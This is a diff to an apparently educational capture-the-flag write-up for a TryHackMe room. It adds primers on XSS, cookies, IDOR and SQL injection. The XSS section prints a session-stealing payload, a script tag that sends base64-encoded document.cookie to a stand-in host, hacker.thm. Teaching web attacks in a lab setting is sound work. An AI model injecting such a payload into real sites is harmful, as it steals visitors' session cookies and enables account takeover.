@@ -21,19 +21,49 @@ mermaid: true
 
 And that's all there is! We are now left alone to figure out where those three flags are 🤔 !
 
-### 2.1 XSS
+Let's see what kind of background knowledge is needed for solving this CTF.
+
+### 2.1 Cross-site Scripting (XSS)
+
+**Cross-site Scripting (XSS)** is an injection attack where the payload, i.e. malicious JavaScript code, gets injected into a web application with the intention of being executed by other users.
+
+Many payload types exist, but the one we are interested in for this room is used for **Session Stealing**, and looks like this:
+
+```javascript
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+```
+
+There are also different kinds of XSS, one of them is called **Stored XSS**, which, as the name infers, stores its payload on the web application and then gets run when other users visit the page.
+
+![XSS_image](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/sorted-XSS.png.webp)
+
+If the above information does not make sense, try going through TryHackMe's [XSS](https://tryhackme.com/room/xss) room before attempting this room.
 
 ### 2.2 Cookies
 
-### 2.3 IDOR
+**Cookies** are small pieces of data that are stored on our computer, and they are saved when we receive a "*Set-Cookie*" header from a web server. Because *HTTP* is *stateless* (does not keep track of previous requests), cookies can be used to remind the web server who we are. 
 
-Taken from, the highly recommended, TryHackMe's [IDOR room](https://tryhackme.com/room/idor):
- 
-**Insecure Direct Object Reference** is a type of **access control vulnerability**. This can occur when a web server receives user-supplied input to retrieve objects and the input data is not properly validated on the server-side to confirm the requested object belongs to the user requesting it.
+Cookies have many uses, but are most commonly used for website authentication. They don't have a plaintext format so we can't see the password, but they come in the form of a **token**, a unique secret code that isn't easily humanly guessable.
 
-For example, the following link could open our own profile: `http://online-service.thm/profile?user_id=1305`. If we could see another user's profile by changing the `id` value, we have found an IDOR vulnerability.
+![cookie-auth](https://media.geeksforgeeks.org/wp-content/uploads/20211206163821/Group2copy-660x330.jpg)
 
-### 2.4 SQLi
+As always, there is the [HTTP in detail](https://tryhackme.com/room/httpindetail) room which is dedicated to the **HTTP protocol**, and I would highly suggest to go through that as well! 
+
+### 2.3 Insecure Direct Object Reference (IDOR)
+
+**Insecure Direct Object Reference (IDOR)** is a type of **access control vulnerability**. This can occur when a web server receives user-supplied input to retrieve objects and the **input data is not properly validated** on the server-side to confirm the requested object belongs to the user requesting it.
+
+For example, the following link could open our own profile: `http://online-service.thm/profile?user_id=1305`. If we could see another user's profile by tampering with the `user_id` parameter's value, we have found an IDOR vulnerability.
+
+The above information are directly taken from TryHackMe's [IDOR](https://tryhackme.com/room/idor) room.
+
+### 2.4 Structured Query Language Injection (SQLi)
+
+**SQLi** is an attack on a web application database server that causes malicious queries to be executed. 
+
+When a web application communicates with a database using input from a user that **hasn't been properly validated**, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas.
+
+![sqli_explained](https://images.spiceworks.com/wp-content/uploads/2022/05/13064935/Functioning-of-an-SQL-Injection.png){: width="60%"}
 
 [SQL Injection](https://tryhackme.com/room/sqlinjectionlm) room
 
@@ -70,7 +100,7 @@ So we already have two **valid usernames** at hand, and we could try a *dictiona
 
 Let's try to exploit our second point, the **Sign up** page as well as the author's **hint**, as it should logically guide us to the first flag.
 
-When signing up, the *New listing* option appears:
+When signing up, the *New listing* option appears at the top right menu:
 
 ![new-listing](new-listing.png){: width="50%"}
 
